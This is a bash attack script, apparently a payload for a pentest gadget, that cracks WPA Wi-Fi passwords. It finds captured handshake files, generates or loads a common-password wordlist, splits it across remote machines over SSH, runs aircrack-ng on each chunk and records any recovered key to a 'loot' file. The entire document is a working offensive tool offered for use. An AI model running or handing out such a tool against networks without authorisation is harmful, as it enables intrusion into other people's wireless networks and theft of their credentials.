#!/bin/bash
# Title: Mesh Cracker
# Author: bad-antics
# Description: Distributed WPA cracking across multiple machines via SSH mesh
# Category: nullsec/crack

LOOT_DIR="/mmc/nullsec/mesh-crack"
MESH_HOSTS_FILE="/mmc/nullsec/mesh-hosts.txt"
mkdir -p "$LOOT_DIR"

PROMPT "MESH CRACKER

Distributed WPA cracking.
Splits wordlists across
multiple machines for
parallel cracking power.

Combined CPU/GPU power
of your entire mesh.

Press OK to configure."

# Find handshakes
mapfile -t CAPS < <(find /mmc/nullsec -name "*.cap" -o -name "*.pcap" -o -name "*.hccapx" 2>/dev/null | head -20)
if [ ${#CAPS[@]} -eq 0 ]; then
    ERROR_DIALOG "No captures found!

Run HandshakeHunter or
PMKIDCapture first."
    exit 1
fi

FILE_LIST=""
for i in $(seq 0 $((${#CAPS[@]} - 1))); do
    FILE_LIST="${FILE_LIST}$((i+1)). $(basename "${CAPS[$i]}")\n"
done

PROMPT "CAPTURES FOUND: ${#CAPS[@]}

$(echo -e "$FILE_LIST")
Select target on next."

FILE_NUM=$(NUMBER_PICKER "File # (1-${#CAPS[@]}):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac
[ "$FILE_NUM" -lt 1 ] && FILE_NUM=1
[ "$FILE_NUM" -gt "${#CAPS[@]}" ] && FILE_NUM=${#CAPS[@]}
TARGET="${CAPS[$((FILE_NUM - 1))]}"

# Discover mesh nodes
PROMPT "MESH NODES

Enter SSH hosts (user@ip)
one per line in:
$MESH_HOSTS_FILE

Or auto-detect from
nullsec-link config.

Press OK to scan mesh."

# Auto-detect from nullsec-link or manual config
NODES=()
if [ -f "$HOME/.config/nullsec-link/config.sh" ]; then
    while IFS='|' read -r ip user label role; do
        [ -n "$ip" ] && ssh -o BatchMode=yes -o ConnectTimeout=3 "${user}@${ip}" "echo ok" &>/dev/null && NODES+=("${user}@${ip}")
    done < <(grep "register_machine" "$HOME/.config/nullsec-link/config.sh" 2>/dev/null | grep -oP '"[^"]*"\s+"[^"]*"\s+"[^"]*"' | awk -F'"' '{print $4"|"$6}')
fi

# Fallback: check mesh-hosts file
if [ ${#NODES[@]} -eq 0 ] && [ -f "$MESH_HOSTS_FILE" ]; then
    while read -r host; do
        [ -n "$host" ] && ssh -o BatchMode=yes -o ConnectTimeout=3 "$host" "echo ok" &>/dev/null && NODES+=("$host")
    done < "$MESH_HOSTS_FILE"
fi

NODE_COUNT=${#NODES[@]}
TOTAL_CORES=$(nproc)

for node in "${NODES[@]}"; do
    RC=$(ssh -o BatchMode=yes "$node" "nproc" 2>/dev/null)
    TOTAL_CORES=$((TOTAL_CORES + RC))
done

PROMPT "MESH READY

Local + $NODE_COUNT remotes
$TOTAL_CORES total CPU cores

Wordlist options:
1. Quick (10K words)
2. Standard (100K words)
3. Custom path

Select on next."

WL_MODE=$(NUMBER_PICKER "Mode (1-3):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) WL_MODE=1 ;; esac

WORDLIST="/tmp/mesh_wordlist.txt"
case $WL_MODE in
    1)
        # Generate common passwords
        > "$WORDLIST"
        for base in password admin welcome login letmein master qwerty monkey dragon sunshine; do
            for suf in "" 1 12 123 1234 12345 "!" "!!" "@" "123!" 2024 2025 2026; do
                w="${base}${suf}"; [ ${#w} -ge 8 ] && echo "$w" >> "$WORDLIST"
            done
            echo "${base^}${suf}" >> "$WORDLIST"
        done
        ;;
    2)
        if [ -f /mmc/wordlists/rockyou-mini.txt ]; then
            WORDLIST="/mmc/wordlists/rockyou-mini.txt"
        else
            > "$WORDLIST"
            for base in password admin welcome login letmein master qwerty monkey dragon sunshine \
                        princess football shadow michael ninja mustang access hello charlie thomas \
                        love baby angel friends flower soccer; do
                for suf in "" 1 12 123 1234 12345 "!" "@" "#" "$" "2020" "2021" "2022" "2023" "2024" "2025" "2026"; do
                    w="${base}${suf}"; [ ${#w} -ge 8 ] && echo "$w" >> "$WORDLIST"
                done
                echo "${base^}123" >> "$WORDLIST"
                echo "${base^^}!" >> "$WORDLIST"
            done
        fi
        ;;
    3)
        WORDLIST=$(TEXT_PICKER "Wordlist path:" "/mmc/wordlists/rockyou.txt")
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac
        ;;
esac

[ ! -f "$WORDLIST" ] && { ERROR_DIALOG "Wordlist not found!"; exit 1; }

TOTAL_WORDS=$(wc -l < "$WORDLIST")
CHUNK_SIZE=$(( TOTAL_WORDS / (NODE_COUNT + 1) ))

resp=$(CONFIRMATION_DIALOG "MESH CRACK

Target: $(basename "$TARGET")
Nodes:  $((NODE_COUNT + 1))
Words:  $TOTAL_WORDS
Chunk:  $CHUNK_SIZE per node

Start distributed crack?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "MeshCracker: $TOTAL_WORDS words across $((NODE_COUNT+1)) nodes"
SPINNER_START "Distributing & cracking..."

# Split wordlist
split -l "$CHUNK_SIZE" -d "$WORDLIST" /tmp/mesh_chunk_

CHUNKS=($(ls /tmp/mesh_chunk_* 2>/dev/null))
PIDS=()

# Local chunk
aircrack-ng -w "${CHUNKS[0]}" "$TARGET" > /tmp/mesh_result_local.txt 2>&1 &
PIDS+=($!)

# Remote chunks
for i in $(seq 0 $((NODE_COUNT - 1))); do
    CHUNK_IDX=$((i + 1))
    [ "$CHUNK_IDX" -ge "${#CHUNKS[@]}" ] && break
    NODE="${NODES[$i]}"
    scp -q "${CHUNKS[$CHUNK_IDX]}" "${NODE}:/tmp/mesh_chunk" 2>/dev/null
    scp -q "$TARGET" "${NODE}:/tmp/mesh_target.cap" 2>/dev/null
    ssh -o BatchMode=yes "$NODE" "aircrack-ng -w /tmp/mesh_chunk /tmp/mesh_target.cap > /tmp/mesh_result.txt 2>&1" &
    PIDS+=($!)
done

# Wait for any to find the key
FOUND=""
while true; do
    # Check local result
    if grep -q "KEY FOUND" /tmp/mesh_result_local.txt 2>/dev/null; then
        FOUND=$(grep "KEY FOUND" /tmp/mesh_result_local.txt | sed 's/.*\[ \(.*\) \].*/\1/')
        break
    fi
    # Check remote results
    for node in "${NODES[@]}"; do
        R=$(ssh -o BatchMode=yes "$node" "grep 'KEY FOUND' /tmp/mesh_result.txt 2>/dev/null")
        if [ -n "$R" ]; then
            FOUND=$(echo "$R" | sed 's/.*\[ \(.*\) \].*/\1/')
            break 2
        fi
    done
    # Check if all done
    ALL_DONE=true
    for pid in "${PIDS[@]}"; do kill -0 "$pid" 2>/dev/null && ALL_DONE=false; done
    $ALL_DONE && break
    sleep 5
done

# Kill remaining
for pid in "${PIDS[@]}"; do kill "$pid" 2>/dev/null; done

# Cleanup remotes
for node in "${NODES[@]}"; do
    ssh -o BatchMode=yes "$node" "rm -f /tmp/mesh_chunk /tmp/mesh_target.cap /tmp/mesh_result.txt" 2>/dev/null &
done
rm -f /tmp/mesh_chunk_* /tmp/mesh_result_local.txt

SPINNER_STOP

if [ -n "$FOUND" ]; then
    echo "$(date) | MESH | $(basename "$TARGET") | $FOUND" >> "$LOOT_DIR/cracked.txt"
    PROMPT "KEY FOUND!

$FOUND

Cracked across $((NODE_COUNT+1))
machines in mesh mode.

Saved to mesh-crack/cracked.txt"
else
    PROMPT "NO MATCH

Exhausted $TOTAL_WORDS words
across $((NODE_COUNT+1)) machines.

Try larger wordlist or
pattern-based attack."
fi
